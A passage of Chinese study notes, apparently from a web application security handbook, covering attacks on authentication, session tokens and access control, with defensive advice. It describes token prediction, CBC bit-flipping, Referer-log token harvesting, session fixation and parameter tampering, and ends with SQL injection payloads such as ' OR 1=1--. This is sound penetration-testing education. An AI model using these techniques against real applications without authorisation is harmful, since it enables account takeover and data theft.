绝对避免使用密码“暗示”之类的功能，因为很多用户自己设置的暗示跟明示差不多； 日志、监控与通知应用程序应在日志中记录所有与验证有关的事件，包括登录、退出、密码修改、密码重设、账户冻结与账户恢复，日志中应包含一切相关的细节（如用户名和 IP 地址），但不得记录任何机密信息（例如密码）；应用程序应为日志提供强有力的保护，以防止未授权的访问，因为它们是信息泄露的主要源头； 当出现异常事件时，应用程序应进行实时警报和主动入侵防御； 应以非常规的方式通知用户任何重大的安全事件，例如在用户尝试修改密码后，向其发送邮件进行告知； 应以非常规的方式告知用户其上次登录的时间和位置，以及在那之后无效登录的次数，以便让用户知悉其账户很可能正在遭受蛮力攻击，保存其设置更加安全的密码； 小结验证功能是应用程序受攻击面中最重要的目标，匿名用户可以直接访问该功能，使得其很容易暴露在所有攻击者面前；现实的验证机制存在着大量的设计与执行缺陷，使用系统化的方法尝试各种攻击途径，即可以对这些缺陷发起全面有效的攻击； 许多时候，漏洞显得易见；另一方面，有些缺陷隐藏得很深，需要对登录过程的逻辑进行反复推敲和分析，才能发现并利用这些缺陷； 7. 攻击会话管理状态要求会话机制中存在两大类的漏洞： 生成会话过程中的漏洞； 处理会话过程中的漏洞； 渗透测试步骤 应用程序经常在多个地方使用会话，包括 cookie、 URL 参数、隐藏表单字段等，以适应不同功能的状态判断需要，避免只检查一个地方； 有时候由 Web 服务器生成的标准会话令牌只是例行动作，并不定表示它一定会被应用程序所使用； 当用户经过验证后，仔细检查客户端收到哪些新的数据项，一般来说，应用程序在此时建立新的会话令牌； 找一个确定需要使用会话令牌数据的页面，例如个人资料页，尝试性的删除某个疑似令牌的数据后提交请求，如果返回的页面出现变化，不再是原来的那个页面，则说明该数据很可能为会话令牌； 并不是每个应用程序都会使用会话，有也其他替代方案可以用来进行状态 HTTP 验证：客户端在每次请求中，都在消息头中重复提交密码进行验证； 无会话机制：将用户的状态数据保存在客户端，由用户在下一次请求的时候提交这些状态数据，没有保存在服务端，这样服务端就没有必要使用会话机制维护状态了；如果使用这种方式的话，就需要使用一个比较大的对象来存放状态信息了； 渗透测试步骤 用排查法进行测试，看是否存在疑似令牌的数据； 如果存在以下现象，则说明应用程序很可能将会话状态保存在客户端，包括：向客户端发送的令牌数据比较大（如大于等于100B）、应用程序对每个请求做出响应后，发布一个新的类似令牌、数据似乎被加密（无法辨识其结构）或包含签名（由于有意义的结构和几个字节的无意义二进制数据组成）、应用程序拒绝通过多个请求提交相同数据的做法； 如果应用程序不使用会话令牌管理状态，则本章的所有攻击手段都没有效果，需要寻找其他方向的漏洞来进行渗透； 会话令牌生成过程中的薄弱环节使用令牌的一些场景 发送到用户注册的电子邮件地址的密码恢复令牌； 存放在隐藏表单字段中的令牌，用于防止跨站点脚本攻击； 用于一次性访问受保护资源的令牌； “记住我”功能使用的永久令牌； 未启用验证功能的购物应用程序，让用户可检查当前订单状态的令牌； 令牌有一定的含义有些应用程序没有随机生成令牌，而是基于用户的个人信息来生成令牌；而用户的信息字段呈现某种多样性，有数字、字符串、邮件等；为了让信息的传输符合 HTML 的标准，应用程序先对信息进行编码，例如十六进制、Base64 等，这种方式通常会表现出某种结构，例如通常以分隔符隔开；另外，不同部分很可能使用不同的编码方式； 结构化的令牌的组成成分常包括以下几项： 账户用户名、用户姓名中的名和姓、用户的电子邮件地址、用户的角色； 应用程序用来区分账户的数字标识符； 日期时间截； 一个递增或可预测的数字； 客户端的 IP 地址； 虽然结构化令牌经常包含很大的数据量，但并不是每个请求都会使用里面的全部数据，每个请求经常只使用其中的一两个数据项； 渗透测试步骤 从应用程序获取一个令牌，每次修改其中的一个字节，然后重新发送，观察应用程序是否仍然正常响应；如果是的话，说明所修改的部分并未在请求处理过程中发挥作用，可以在接下来的分析中将其排除在外，以减轻分析的负担，提高效率； 在不同的时间，以不同的用户登录，记录服务器发布的令牌数据； 如果允许自我注册，注册一些非常相近的用户名并登录，观察返回的令牌的区别； 如果在登录阶段，有提交一些与用户相关的数据，对其进行系统化的修改，并记录登录后收到的令牌； 对令牌进行分析，查找任何与用户名或其他用户可控制的数据相关的内容； 查找令牌中任何明显的编码或模糊处理方案；常用的方案有 XOR、十六进制、Base64 等； 当对令牌数据的逆向工程取得有意义的结果时，尝试看能否猜测出应用程序最近向其他用户发布的令牌，在一个使用令牌才能显示令牌的页面，发送大量的请求，对猜测结果进行测试； 令牌可预测有时候令牌中并不包含任何与用户有关的数据，但是令牌的生成本身具有的一定的顺序规律性，因此可以尝试猜测其他可能存在的有效令牌，并发送大量请求进行验证；这种方法的成功率比较低，可能只有千分之一，但是由于可以使用自动化的工具，在短时间内发送大量的请求进行验证（例如验证响应的长度即可区分有效和无效的请求），因此它也能够在短时间内找到很多有效的令牌； 可预测的会话令牌通常源于三点： 隐含序列； 时间依赖； 生成的数字随机性不强； 隐含序列有时候序列并不是一眼就可以发现的，需要在第一轮的解码后，再做第二轮的算术处理例如第二个值减去第一个值，之后就会暴露出其中隐藏的模式出来； 时间依赖有些令牌的生成跟时间有关（一般会呈现递增规律），虽然以毫秒进行计算得到的随机值很大，但是攻击者可以每隔一小段时间就获取令牌，当发现跳跃的时候，很可能是应用程序给一个刚登录的用户生成了令牌，由于攻击者拥有该跳跃前和跳跃后的令牌数据，因此可以大大缩小枚举的范围，通过不断发请求进行尝试，获得用户的有效令牌；攻击者可以使用这个方法一直枚举有效令牌，直至等到管理员登录，届时将直接获得管理员的权限； 生成的数字随机性不强计算机生成的随机数基本上都是伪随机的，它其实是有规律的，差别在于开发者如何去除它的规律性，如果开发者使用成熟框架的默认函数，则去除的办法相当于被公开了，那么攻击者在获得一个令牌后，就可以推测出下一个令牌的值，甚至之前所有令牌的值； 测试随机性强度如果收集了足够多的令牌样本后，就可以使用统计方法来判断令牌是否具备随机性；它的基本理念是在大量令牌中判断某些特殊点的出现次数，看它是随机分布的，还是具备一定的规律性；Burp Sequencer 即是一个现成的判断随机性的工具； 两个注意事项： 即使是按照既定算法计算的结果，也是有可能通过随机性测试的，此时并不代表这个令牌没有漏洞，在了解了算法和生成器的内部状态后，就可以非常准确的正向或者逆向推断出它的输出； 没有通过随机机测试的令牌，也不能保证它一定可以被逆向工程；因为部分数据位出现非随机性，不代表整个序列可以被预测； 渗透测试步骤 遍历整个应用程序，观察它是在什么场景下发布新令牌的；一般来说有两种常见的场景会发令牌，一种是登录后，一种是在请求中没有发现令牌的时候；只要找到了这个场景，才能够大量的收集令牌； 使用 Burp Suite 中的 Burp Sequencer 功能对令牌进行实时补获，以便尽可能多的收集令牌，避免错失应用程序给那些真正的用户发布的令牌，同时这样也可以降低对时序的依赖； 如果应用程序使用商业会话管理机制，或者可以本地访问应用程序，则可以在受控的条件下收集无数的令牌； 在 Burp 收集令牌的同时，打开“自动分析”的功能；先至少收集500个令牌，然后详细审查分析结果；即使令牌中有足够的数据位通过了测试，也继续尽可能长时间的收集令牌，并在审查分析结果； 如果令牌未通过随机性测试，并且似乎包含某种模式可用于预测，此时需要更换一个 IP 地址，使用不同的用户名重新开始收集操作；因为令牌有可能使用用户名或者用户的 IP 地址作为令牌生成的参数； 如果攻击者对令牌的生成算法有了把握，接下来最好的办法是使用一段定制的脚本来实施攻击，因为它能够使用观测到的模式来生成令牌，并用上相应的编码技巧； 如果可以查看源代码，则应仔细检查负责生成令牌的代码，了解它使用的机制，并确定是否能够轻易的预测该令牌； 如果确定可以从应用程序数据中的熵实施蛮力攻击，则需要预估一下需要发起的具体请求数； 加密令牌有些应用程序在令牌中包含有意义的信息，并对这些进行加密；根据所使用的不同加密算法，这种做法可能是有漏洞的； ECB 密码ECB 指电子密码本，它经常被一些对称加密算法所使用；它的缺点是明文与密文存在相似的模式，例如相同的分组方法； 由于令牌中的内容不一定会被应用程序全部使用，因此通过更改和拼接分组的内容，可能会导致出现用户伪装的漏洞； CBC 密码CBC 表示密码块链，它的出现是为了解决 ECB 存在的漏洞问题，即在将某段明文转换成密文之前，先把它与上一个密文块做 XOR 运算，之后再转换成密文；这样就可以避免 ECB 中存在的分组漏洞问题了； 但是这种方式也引入了新的漏洞，因为攻击者可以让每次请求只修改令牌中的一个字符，虽然更改后的令牌被解密的时候，相应的字段会变成乱码，但由于该段的值会被用做上一段的 XOR 运算输入，即使是乱码值，也有可能生成有意义的 XOR 运算结果；那么，当应用程序没有判断所有字段内容进行令牌有效性判断的话，只读取其中某个字段的值，那么攻击者将有可能伪装成功； Burp Intruder 中的 bit flipper（位翻转程序）即可以用来测试令牌是否有这方面的漏洞；位翻转对数字类型的值的效果比较好，对文本类型的效果比较差； 当应用程序在令牌中使用某种对称性加密算法时，如果应用程序的其他功能也需要使用加密算法时，很有可能它们会使用同一个对称加密算法，此时如果能在应用程序的其他功能获得某个加密值的源值（例如通过受控账户控制输入值），则可以利用这个信息完全解密任何受保护的信息； 渗透测试步骤 如果会话令牌没有明显的意义，或者本身是连续的，那么令牌很有可能是被加密的； 通过注册几个不同的用户名，每次为用户名多添加一个字符，如果添加一个字符会让令牌的长度增加8或16个字节，则说明应用程序可能使用的是分组密码；此时可以再注册一个添加一个字符的用户名，看是否同样的增加了8或16个字节； 可尝试通过移动令牌中的密文分组进行登录，看应用程序如何反应； 可尝试使用位翻转令牌中有效的荷载源来访问应用程序，如果翻转后应用程序仍然能否正常使用，那么可以扩大范围，对这个部分中的每个值进行测试，以找到更有针对性的攻击方法； 在前述的两种攻击方法中，注意监控应用程序的反应，确定响应中的用户信息是否出现变化；如果有的话，可使用这种方法来尝试提升权限； 在通过增加单个字符来获取更长的令牌的时候，通过反复不断增加字符，最后可以达到应用程序所使用的分组大小，这样就增加了分组边界对齐的概率；然后，对于不同用户名生成的一系列令牌，使用前面两种操作（移动或者翻转）进行尝试 会话令牌处理中的薄弱环节在网络上泄露令牌 当令牌使用非加密方式在网络上传输时，就有可能导致令牌泄露；之后窃听者并不需要破解令牌，只需要使用获得的令牌就可以伪装成其他用户进行登录了（由于还能够截获其他机密信息，理论上窃听者都可以使用密码自行登录，但有时候为了尽量保持隐秘，有可能没这么做）； 有些应用程序在用户初始打开页面的时候，就给用户发了令牌，但是此时却是使用 HTTP 传输，之后等用户登录的时候才转成 HTTPS，并且在用户登录后没有给用户发送新令牌；即使在用户登录后使用新令牌，如果此时用户点击了应用程序中那些不需要验证的页面，转成了 HTTP 传输，此时将直接造成令牌泄露； 有些应用程序对所有静态资源使用 HTTP，如果此时用户已经在之前的页面完成了验证，则将使得令牌泄露； 即使应用在所有页面都使用了 HTTPS 传输，如果攻击者有方法诱使用户发送一个 HTTP 请求，即可以获得这个令牌；（攻击者一般可以通过在电子邮件中或即时消息中给用户发送一个 URL，并在他控制的一个 Web 站点中插入一个自动加载的链接即可完成相应的目的）； 渗透测试步骤 以正常方式访问应用程序，进行登录，然后访问应用程序的每一个功能，记录每一个被访问的 URL 以及收到新会话令牌的每种场合；特别注意 HTTP 和 HTTPS 进行切换的场景；可使用网络嗅探器或使用代理服务器中的日志自动化完成这一个工作； 如果应用程序使用 HTTP cookie 来传送会话令牌，此时应注意是否启用 secure 字段，如果没启用的话，则令牌是通过非加密连接传送的，很容易可以实现拦截； 如果初始使用 HTTP，在登录后切换到 HTTPS，确定一下是否有发布新令牌，以及在 HTTP 阶段的令牌是否仍然可用；并且尝试再切换回 HTTP 的页面时，应用程序是否仍然可以访问； 即使应用程序在每一个页面都使用 HTTPS，确认一下服务器是否监听 80 端口，如果是的话，直接使用验证后的会话令牌访问所有的 HTTP URL，确认会话令牌是否被传送；如果有传送，确认下是否依然有效； 在日志中泄露令牌很多应用程序会为管理员或运营人员提供监控应用状态的功能，这些功能有时会访问应用程序的日志，当这些功能没有得到很好保护的时候，攻击者就有可能使用它来获得所有用户的令牌列表； 日志中之所以有会话令牌，其中一个重要的原因是有很多应用使用 URL 参数来传送令牌，而不是使用 cookie 或者 POST 请求； 处于 URL 参数中的令牌，将会在以下各种场景中被记录： 用户浏览器的日志； Web 服务器的日志； 企业或 ISP 代理服务器的日志； 任何在应用程序主机环境中采用的反向代理日志； 应用程序的用户，点击站外链接访问的任何服务器的 Referer 日志； 虽然 HTTPS 可以防止 URL 中的参数被日志记录，但是如果用户点击了页面中的站外链接，包含参数的完整 URL 将会出现在站外链接服务器收到的消息头中的 Referer 字段中； 渗透测试步骤 找出应用程序的所有功能（参见之前搜索隐藏链接的技巧），找出可以查看会话令牌的任何日志或监控功能；并查明认证可以访问这些功能； 找出应用程序中使用 URL 传送会话令牌的任何情况；即使应用程序在内部都使用安全的传输方式，但在访问外部系统时，有时会使用非安全的传输方式； 如果应用程序在 URL 中传送会话令牌，那么可以寻找一些允许用户自动上传内容的功能，使用这些功能，上传包含站外链接的内容，链接至自己搭建的服务器，等待一段时间，查看日志中的 Referer 字段是否收到任何用户的会话令牌； 如果截获到任何会话令牌，通过拦截服务器的下一个响应，使用截获的 cookie 值添加自己的 Set-Cookie 消息头，来实现切换用户的目的；在 Burp 中，可以使用一个 Suite 范围的配置，在所有指向目标应用程序的请求中设置一个特殊的 cookie，以便在测试期间可以在不同的用户之间快速轻松切换； 如果截获大量的令牌，并且通过截获的令牌可以访问用户的敏感数据，就能通过自动化工具获得大量的其他用户的数据； 令牌-会话映射易受攻击理想的会话管理机制中，不应该允许同一名用户拥有多个会话，因为这样有很多安全的隐患，例如攻击者利用会话进行连接却不会被发现； 有些应用程序使用静态的会话令牌，这种情况更加糟糕，因为它完全无法判断是否同时存在多个会话，而且令牌永远有效，一旦泄露，更改密码也没有用； 有些应用程序使用用户名+1个随机值来生成令牌，这种机制生成出来的令牌看似随机，但其实跟静态会话可能没有什么两样，因为只要随机值是有效的，这个令牌就自然生效了，完全不需要验证； 渗透测试步骤 用相同的用户账户不同的浏览器或计算机先后登录应用程序，确定这两个会话是否会都处于活动的状态，如果是的话，表示应用程序并行会话；这样截获其他用户令牌的攻击不会有被检测出来的风险； 用相同的账户，在不同的浏览器先后登录并退出系统，比对每次收到的令牌是一样的，还是不同的；如果都一样，说明令牌是静态的，有严重的设计缺陷； 如果令牌包含某有结构和意义，尝试将其他与用户有关的部分隔离出来，单独修改该部分的值，让它指向另外一个用户，确定修改后的令牌是否能否正常使用，以及能否伪装成其他用户； 会话终止易受攻击让会话的生命周期尽量短有两个好处： 一是可以避免攻击者利用被截获的令牌； 二是可以避免用户使用共享计算机时出现的危险； 有些应用程序设计得很糟糕，要么完全没有让用户自行终止会话的行为，要么即使有也并没有真正的执行； 渗透测试步骤 通过以下方式检查服务端是否执行了终止会话的操作：登录获取一个有效令牌，每间隔一段时间访问一下需要该令牌才能访问的页面，看应用程序是否返回正确的响应（可在自动化工具中设置好时间间隔）； 查找一下是否有退出的功能，如果没有，意味着用户无法主动终止会话，存在被攻击的隐患； 如果有退出的功能，在退出后，测试一下原来的令牌是否能够有效，如果有效，表示这是一个假退出； 客户端暴露在令牌劫持风险之中保存在客户端的令牌有可能存在被窃取的风险，例如使用跨站点脚本、或者固定令牌伪装； 渗透测试步骤 确认应用程序中是否存在跨站点脚本漏洞，看是否可以利用这些漏洞截获其他用户的令牌； 如果应用程序在用户登录前就发令牌，并且登录后仍沿用该令牌，则说明容易受到固定会话攻击； 即使应用程序在用户未登录前没有发令牌，而只是在登录后发令牌，如果在登录后，应用程序允许用户返回登录前的那个页面，这意味着用户很可能可以使用已获得的有效令牌，然后用另外一个用户名登录；如果在登录后，应用程序没有发一个新令牌，那么存在固定会话攻击的漏洞； 确定应用程序会话令牌的格式；用一个格式有效的伪造令牌尝试进行登录，如果应用程序允许使用一个捏造的令牌建立一个通过验证的会话，那么存在固定会话漏洞； 如果应用程序完全依靠 HTTP cookie 传送会话令牌，有可能容易受到跨站点请求伪造（CSRF）的攻击；先登录应用程序，然后在同一个浏览器进程中，在其他站点页面向先应用程序发送一个请求，确认它是否会提交用户的令牌；可利用这个缺陷执行目标用户权限下的一些操作（攻击者需要先确定好相关敏感功能所需要提交的各项参数）； 宽泛的 cookie 范围根据 HTTP 协议，服务器在 Set-Cookie 字段中，还可以使用 domain 和 path 两个字段来告知浏览器该 cookie 适用的域名和路径； cookie 域限制如果没有指定 domain 的值，cookie 默认仅适用于当前域及其子域，不包含父域或者兄弟域； 如果服务端在指定 domain 值的时候，设置得过于宽泛，例如 abc.com 之类的根域名，这意味着该 cookie 将在根域名下的任何子域名中都有效；那么任何一个子域名页面，都有机会收集原本属于其他子域名的 cookie； 由于基于域的 cookie 隔离没有同源策略那么严格，当一个应用程序和另外一个漏洞应用程序共享同一个根域名，而只是通过端口号或者协议来区别彼此的时候，攻击者将有机会利用这种漏洞通过一个应用程序获取另一个应用程序的 cookie； 渗透测试步骤 如果应用程序将 cookie 范围放宽到父域，将容易受到通过兄弟域名下的其他应用程序实施的攻击； 如果应用程序使用 domain 的默认值，或者将其设置为当前域名，则子域仍然可以访问 cookie； 确定一个应用程序的所有子域名，如果子域名下有其他应用程序，尝试通过他们获取当前应用程序的 cookie cookie 路径限制HTTP 协议支持对 cookie 的作用路径进行指定，默认也是当前路径及其下的子路径；但如果开发者扩大了路径范围，将使得父级路径和兄弟路径的不可信程序有机会控制应用程序； 保障会话管理的安全生成强大的令牌有效的令牌生成机制应该具备以下两个特点： 使用数量极其庞大的一组可能值；取值范围应大到让攻击者在令牌有效期无法通过蛮力猜测破解； 包含强大的伪随机源，确保令牌值以无法预测的方式平均分布在取值范围中； 令牌中不应该保存任何有意义的数据，整个会话对象应该保存在服务端； 谨慎选择随机数算法，确保它是不可预测的；当然这也是要付出代价的，越不容易猜测的随机数，意味着计算它的时间越久，使得应用程序的响应越慢； 除了选择最为稳定可靠的随机数算法外，在生成令牌的过程中，加入一些额外的令牌（如访问者 IP，请求的时间截）作为熵源，也是一种良好的作法； 在整个生命周期保障令牌的安全 令牌只能使用 HTTPS 传送； 绝不能在 URL 中传送会话令牌； 总是执行退出功能，删除服务器上的所有会话资源并终止会话令牌； 会话处于非活动状态一段时间后（如10分钟），应执行会话终止； 防止并行登录；每次登录都发布一个新的令牌，同时终止删除现有用户的所有会话；如果旧令牌不能马上删除的话，如果有用户使用旧令牌尝试登录，应给用户发出警报，告知有在其他设备尝试登录； 尽可能限定会话 cookie 的域和路径范围，留意框架或 Web 服务器软件的默认配置； 应严格审查应用程序的源代码，避免存在任何形式的跨站点脚本漏洞； 如果有用户提交服务器不认可的令牌，应立即在浏览器删除该令牌，并将用户返回到应用程序的起始页面； 在执行转账之类的重要操作前，应进行两步确认或重新验证，以便有效防御跨站点请求伪造和其他会话攻击； 跨站点请求伪造攻击之所以可行，其中一个原因在于应用程序可能完全依赖 cookie 来传送令牌，如果应用程序不完全依赖 cookie 传送令牌，例如同时使用每页面令牌，则可以防御跨站点的请求伪造； 成功登录验证后，应总是建立一个新会话，以避免固定会话攻击的影响；如果有无须登录即可提交敏感数据的功能，则不应该在页面上面显示敏感数据，应进行部分隐藏处理； 每页面令牌：除了会话令牌，增加一个每页面令牌，当用户请求一个页面时，生成一个新令牌放在隐藏表单字段中；当用户在该页面发起新请求时，除了验证主令牌外，还验证页面令牌，如果不匹配，整个会话将终止； 日志、监控与警报会话功能应该与日志和警报功能紧密结合，以帮助管理在必要时采取防御措施； 应用程序应监控包含无效令牌的请求； 如果收到大量包含无效令牌的请求，可将其 IP 屏蔽一段时间； 在日志中保留针对会话攻击的记录，有助于管理员对攻击进行调查； 只要有可能，应向用户警报与会话相关的反常事件，例如并行登录、以便促使用户进行检查； 反应性会话终止：当收到一些显然不可能由普通用户提交的请求时，应该迅速终止会话，以便延长攻击者的探查时间； 小结现实世界中的会话管理机制通常存在很多漏洞，并且会成为攻击者的重点目标，因为如果能够攻破管理员的会话，往往能够攻破整个应用程序；耐心与不懈往往是完成攻克的最大利器；虽然解译看似随机生成的令牌费时又费力，但是它通常可以获得巨大的回报； 8. 攻击访问控制常见漏洞完全不受保护的功能有些敏感功能在应用程序中使用隐藏的、没有任何访问控制的 URL 来访问，这是非常危险的，因为 URL 可能出现在任何日志中，浏览器的记录、页面 JS 代码和注释等； 直接访问的方法：某些应用程序会将服务器某个对象的方法前移到客户端组件中，由客户端的代码直接调用，此时有可能存在漏洞，例如用户本来只能某个方法，但现在却将对象的所有方法全部暴露了； 基于标识符的功能服务端的资源经常使用标识符进行访问，有些应用程序会将标识符直接放在请求的 URL 参数中，当标识符很容易被猜测的时候，就很容易被未授权访问； 在某些单页面应用中，不仅资源会使用标识符，连功能都有可能使用标识符，此时如果攻击者发现这些 URL，就可以像拥有高级权限的一样访问它们； 多阶段功能开发者经常会假设访问第二个阶段的用户一定是通过了第一阶段的验证，但其实不然；攻击者可以利用这个漏洞，直接访问第二个阶段的功能； 静态文件有些应用程序的静态文件是由 Web 服务器软件管理的，因此它很可能并没有任何的访问控制，只需要有一个 URL 就可以进行访问了； 这些静态文件包括图片、书籍、报告、二进制代码，甚至有时还会有日志文件； 平台配置错误有些应用程序使用第三方的控件平台来实现访问控制，平台的配置类似防火墙规则的配置，一般基于 HTTP 请求方法、URL路径、用户角色等三个条件实现控制；但是有时开发者会存在规则配置错误的情况，没有完整详细的进行设置，导致可能出现漏洞； 访问控制方法不安全还有一些奇葩的应用程序会使用客户端提交的参数来做出访问控制； 基于参数的访问控制：例如在参数中指明当前用户是否为管理员； 基于 Referer 的访问控制：有些应用程序基于请求中的 Referer 字段值来控制权限，例如来源于管理页面的请求即表示拥有管理员权限； 基于位置的访问控制：例如基于 IP 地址的地理位置，但是这种方 式很容易被绕过，例如使用代理服务器、VPN、移动设备； 攻击访问控制在开始探查访问控制漏洞之前，应先就应用程序现有的响应结果进行分析，之后再有针对性的实施探查； 渗透测试步骤 应用程序是否允许用户访问属于他们的特定数据； 是否存在各种级别的用户，应用程序允许他们访问不同的功能； 管理员使用的功能是否也内置在应用程序中； 分析应用程序的哪些功能或资源最有可能帮助攻击者提升当前的权限； 是否存在任何的标识符（以 POST 消息体或 URL 参数的方式），表明其使用某一参数来控制访问级别； 使用不同用户账户进行测试 渗透测试步骤 功能的访问控制：首先使用一个权限较高的账户确认所有可用的功能，然后使用一个权限较低的账户访问这些功能，测试能否垂直提升权限； 资源的访问控制：首先使用一个用户确认当前用户可访问而其他用户无法访问的资源，然后尝试使用另外一个账户来访问这些资源，测试能否水平提升权限（请求相关的 URL 或提交相同的 POST 参数）； Burp Suite 提供使用两个不同的账户来解析应用程序的访问权限控制的功能，可以大大的提高效率； 渗透测试步骤 使用 A 账户正常访问应用程序的所有功能，记录下站点地图； 使用 B 账户访问站点地图中的所有功能，比对结果； 自动化工具此处只能用来收集信息，无法用于判断漏洞是否存在，需要结合应用程序功能访问的信息，才能进一步判断； 测试多阶段过程多阶段过程由于每个阶段之间存在一定的逻辑顺序关系，经常涉及很多请求，此时需要对过程中的每一个步骤都进行单独的测试，才能判断漏洞是否存在； 渗透测试步骤 在多阶段的过程中，对客户端发给服务端的每个请求，都进行单独的测试，确保每个请求都实施了正确的访问控制； 尝试使用低权限的账户到达某个阶段位置，检测是否可以实施权限提升的攻击； 使用高权限用户完成整个过程，记录下浏览器中的每个请求，之后使用权限较低的用户账号，对于保存的记录再次发起请求，看是否被应用程序允许； Burp 有个工具可以保存每次请求的上下文，然后可以生成一个自己的 URL，只要在浏览器中输入该 URL，Burp 就会调用保存的上下文，然后重要发送请求； 通过有限访问权限进行测试应用程序通常有一些隐藏的功能没有体现在界面中，但是却有可能可以访问； 渗透测试步骤 使用第4章的枚举尽可能多的功能； 如果确信应用程序可能会朋管理员的界面功能，可考虑在请求参数中增加 admin&#x3D;true 之类的字符，确定是否可以访问一些普通用户访问不到的功能； 检查应用程序是否基于 Referer 消息头进行访问控制；尝试删除 Referer 字段值，看是否应用程序会做出不同的反应，如果会的话，说明漏洞可能存在； 检查所有的客户端 HTML 与 JS 脚本，查找有没有隐藏的功能，或者可从客户端进行操纵的功能的引用； 在枚举出应用程序的所有功能后，开始测试应用程序是否正确的对资源进行访问控制；如果应用程序允许用户访问一组内容广泛的相同类型的资源，则用户有机会访问那些未授权的资源； 渗透测试步骤 尝试找到没有权限访问的资源的标识符； 如果有可能生成一系列紧密相连的标识符的话，则可以使用与会话令牌类似的技巧，尝试查找标识符的生成规律； 如果无法生成标识符，则只能通过分析现有的标识符来查找规律；如果标识符的位数比较少，则有可能成功；如很大则很难； 如果资源标识符可以预测，而且访问控制没做好，则可以使用自动化的工具快速获取敏感资源和信息； 如果服务端有将密码发送到客户端，即使不显示，也将是非常危险的，因为只要枚举用户名，就可以获得密码了； 测试“直接访问对象的方法”如果应用程序允许客户端直接调用服务端某个对象的方法（通常表现为传递对象的名称），例如 servlet&#x3D;com.ibm.ws.webcontainer.httpsession.IBMTrackerDebug； 渗透测试步骤 确定任何遵循 Java 命名约定（例如 get, set, add, update, is, has+大写单词等），或明确指定包结构（如 com.companname.xxx.yyy.Classname）的参数； 找到列出对象所有方法的方法；先看该方法是否被调用，如果没有，则尝试猜测它的名称； 上网搜索一下相关的方法名称； 猜测其他可用方法的名称； 常用使用各种账户访问收集到的所有方法； 如果不知某个方法的参数数量和类型，则可以先找那些不需要参数的方法； 测试对静态资源的控制如果某些静态资源可以直接使用 URL 访问，则应该测试一下使用未授权账户是否也能够访问这些资源； 渗透测试步骤 先正常步骤访问某个静态资源，看最终能够获取到它的 URL； 使用权限较低或无权访问该资源的账户，对该 URL 发起请求，看能否成功； 如果可以成功，则开始猜测静态资源的命名方式；尝试设计一个自动枚举名称的脚本，进行自动攻击，获取所有可能有用或可能包含敏感数据的资源； 测试对 HTTP 方法实施的限制应用程序有可能并没有 HTTP 方法实施平台级控制； 渗透测试步骤 使用一个权限较高的账户登录，执行一些需要高操作权限的动作，例如添加用户、更改用户角色等功能； 确定这些操作是否有受到任何反 CSRF 令牌或类似功能的保护，如果 HTTP 的方法被修改，应用程序是否仍然能够完成请求的内容；待测试的方法包括：GET, POST, HEAD，以及任何无效的 HTTP 方法； 如果应用程序会执行用不同方法提交的请求，则使用低权限的账户，再次进行测试； 保障访问控制的安全 仔细评估应用程序每个功能单元的访问控制要求，包括谁能访问这些功能，以及用户通过这些功能能够访问哪些资源； 使用用户会话做出所有访问控制决定； 使用一个单独的组件检查访问控制；通过这个组件处理所有的每一个客户端请求，确认用户访问的资源是被允许的； 使用编程技巧确保前两项没有例外；例如规定每个页面的访问控制都必须通过公用组件来处理； 对于特别敏感的功能，例如管理员页面，可以增加 IP 地址的限制，确保只有内网中的用户可以访问该功能； 对于静态内容，有两种控制方法，一是通过让客户端传送文件名参数，由后端处理后，间接访问静态文件；二是使用 HTTP 验证，在允许访问前检查资源许可； 任何时候通过客户端传送的资源标识符，都需要对其授权重新确认； 对于安全性很高的功能，考虑对操作进行双重验证，进一步确认该功能举动被未授权方使用； 记录每一个访问敏感数据或执行敏感操作的事件，以便后续检测并调查潜在的非法访问事件； 多层权限模型除了对应用程序实施良好的访问控制实践，也应将这些实践或思路使用到基础设施中，例如：应用程序服务器、数据库、操作系统等； 数据库应增加多个账户，有些账户只有查询的权限，供应用程序中仅需查询的功能使用； 应在数据库中增加一个权限表，对数据库中不同的数据库表执行严格的访问控制； 只给每个操作系统账户分配最低权限，仅能运行所需的组件即可； 对于需要复杂权限的应用程序，应该设计一张权限矩阵表，进行清晰化的控制，示例如下： 常见的访问控制概念 编程控制：将数据库权限矩阵保存在一个数据库表中，并以编程的形式做出访问控制决定； 自主访问控制：由管理员分配资源权限给其他用户，分配规则可以是封装式（白名单），也可以是开放式的（黑名单） 基于角色的访问控制：创建很多命名的角色，给用户分配角色；使用角色对用户的请求进行检查； 声明式控制：应用程序使用有限的数据库账户访问数据库，每个账户仅分配到执行所允许操作的最低权限； 渗透测试步骤虽然使用多层控制模型的应用程序可以避免很多常见的访问控制漏洞，但是仍然有一些潜在的漏洞 应用程序的源代码有可能容易受到注入类的攻击； 角色定义不全面或不完整； 低权限的操作系统账户仍然可以访问敏感数据； 应用程序服务器软件本身存在漏洞； 某个小漏洞可能成为实现权限大提升的突破点； 小结许多时候，突破访问控制非常容易；有时在一些高度安全的应用中则很难；“四处看看”是攻击访问控制的最有效方法，如果能够耐心的测试应用程序的每一项功能，也许不久就可以发现一个能攻破整个应用程序的漏洞； 9. 攻击数据存储区注入解释型语言如果使用普通用户登录进行查询，然后使用数据库语言进行注入攻击，有可能直接绕开应用程序的访问控制检查； 渗透测试步骤 提交可能在解释型语言中引发问题的无效语法； 检查应用程序的响应，看是否存在代码注入漏洞的反常现象； 如果收到错误消息，从中获取服务端发生某种问题的证据； 系统性的修改初始输入，尝试确定或否定之前的漏洞假设； 构造一个漏洞验证框架，以可证实的方式执行某些安全的命令，收集证据，检查是否存在漏洞； 利用目标语言和组件的功能来实现攻击，对其中已公开的漏洞加以利用； 注入 SQL如果在本地安装一个与目标应用程序相同的数据库的话，会提高注入的效率，因为很多注入命令可以先在本地数据库进行尝试，观察并结合本地数据库的返回结果，之后再去猜测目标服务器的结果会更容易理解其内部发生的情况； 利用一个基本的漏洞基本原理是利用 SQL 解释型语言动态解释 SQL 语句的特点，在查询参数中添加单引号、注释符等在 SQL 中有意义的关键符号，使得语句进入解释器后，执行不同的查询操作； 123456# 输入项为 &quot;Reilly&quot;SELECT author, title, year FROM books WHERE publisher=&#x27;Reilly&#x27; and published=1# 修改输入项为 Reilly&#x27; OR 1=1--，查询语句变成如下SELECT author, title, year FROM books WHERE publisher=&#x27;Reilly&#x27; OR 1=1--&#x27; and published=1# 修改输入项为 Reilly&#x27; OR &#x27;a&#x27; = &#x27;a，查询语句变成如下SELECT author, title, year FROM books WHERE publisher=&#x27;Reilly&#x27; OR &#x27;a&#x27; = &#x27;a&#x27; and published=1 注入不同的语句类型SELECT 语句用来查询数据，一般配合 WHERE 使用； INSERT 